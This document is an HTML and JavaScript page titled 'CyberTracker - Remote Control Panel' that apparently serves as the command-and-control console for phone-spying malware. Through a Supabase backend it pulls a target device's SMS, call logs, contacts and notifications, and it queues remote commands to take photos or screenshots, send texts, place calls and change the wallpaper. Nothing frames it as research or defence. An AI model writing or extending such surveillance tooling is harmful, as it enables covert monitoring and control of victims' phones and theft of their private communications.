<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberTracker Control Panel</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
</head>
<body>
    <h1>CyberTracker - Remote Control Panel</h1>

    <div class="container">
        <button onclick="fetchDeviceInfo()">ðŸ“± Fetch Device Info</button>
        <button onclick="fetchSMS()">ðŸ“© View SMS Logs</button>
        <button onclick="fetchCallLogs()">ðŸ“ž View Call Logs</button>
        <button onclick="fetchContacts()">ðŸ“– View Contacts</button>
        <button onclick="fetchNotifications()">ðŸ”” View Notifications</button>
        <button onclick="capturePhoto()">ðŸ“· Capture Photo</button>
        <button onclick="takeScreenshot()">ðŸ–¥ Capture Screenshot</button>
        <button onclick="sendSMS()">ðŸ“¤ Send SMS</button>
        <button onclick="makeCall()">ðŸ“² Make Call</button>
        <button onclick="changeWallpaper()">ðŸ–¼ Change Wallpaper</button>
    </div>

    <div id="output"></div>

    <script>
        // Supabase Config
        const SUPABASE_URL = "https://YOUR_SUPABASE_PROJECT_URL.supabase.co";
        const SUPABASE_ANON_KEY = "YOUR_SUPABASE_ANON_KEY";
        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

        async function fetchDeviceInfo() {
            let { data, error } = await supabase.from("Device_Info").select("*");
            if (error) {
                console.error(error);
            } else {
                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            }
        }

        async function fetchSMS() {
            let { data, error } = await supabase.from("SMS_Logs").select("*");
            if (error) {
                console.error(error);
            } else {
                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            }
        }

        async function fetchCallLogs() {
            let { data, error } = await supabase.from("Call_Logs").select("*");
            if (error) {
                console.error(error);
            } else {
                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            }
        }

        async function fetchContacts() {
            let { data, error } = await supabase.from("Contacts").select("*");
            if (error) {
                console.error(error);
            } else {
                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            }
        }

        async function fetchNotifications() {
            let { data, error } = await supabase.from("Notifications").select("*");
            if (error) {
                console.error(error);
            } else {
                document.getElementById("output").innerText = JSON.stringify(data, null, 2);
            }
        }

        async function capturePhoto() {
            await supabase.from("Commands").insert([{ action: "capture_photo" }]);
        }

        async function takeScreenshot() {
            await supabase.from("Commands").insert([{ action: "take_screenshot" }]);
        }

        async function sendSMS() {
            let number = prompt("Enter Phone Number:");
            let message = prompt("Enter Message:");
            await supabase.from("Commands").insert([{ action: "send_sms", number: number, message: message }]);
        }

        async function makeCall() {
            let number = prompt("Enter Phone Number:");
            await supabase.from("Commands").insert([{ action: "make_call", number: number }]);
        }

        async function changeWallpaper() {
            let imageUrl = prompt("Enter Image URL:");
            await supabase.from("Commands").insert([{ action: "change_wallpaper", url: imageUrl }]);
        }
    </script>
</body>
</html>
